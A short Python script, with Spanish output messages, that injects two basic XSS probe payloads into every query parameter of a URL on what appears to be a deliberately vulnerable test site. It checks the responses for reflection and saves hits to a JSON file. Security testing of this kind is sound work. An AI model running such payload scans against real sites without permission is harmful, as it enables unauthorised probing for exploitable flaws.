import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import json


xss_payloads = ["<script>alert(1)</script>", "\"'><img src=x onerror=alert(1)>"]
target_url = "http://testphp.vulnweb.com/search.php?query=test"
resultados = []

for payload in xss_payloads:
    url_parts = list(urlparse(target_url))
    query = parse_qs(url_parts[4])
    for key in query:
        query[key] = payload
    url_parts[4] = urlencode(query, doseq=True)
    new_url = urlunparse(url_parts)

    res = requests.get(new_url)
    if payload in res.text:
        resultados.append({"tipo": "XSS", "url": new_url, "payload": payload})

with open("xss_results.json", "w") as f:
    json.dump(resultados, f, indent=4)

print("[+] XSS test completado. Resultados en xss_results.json")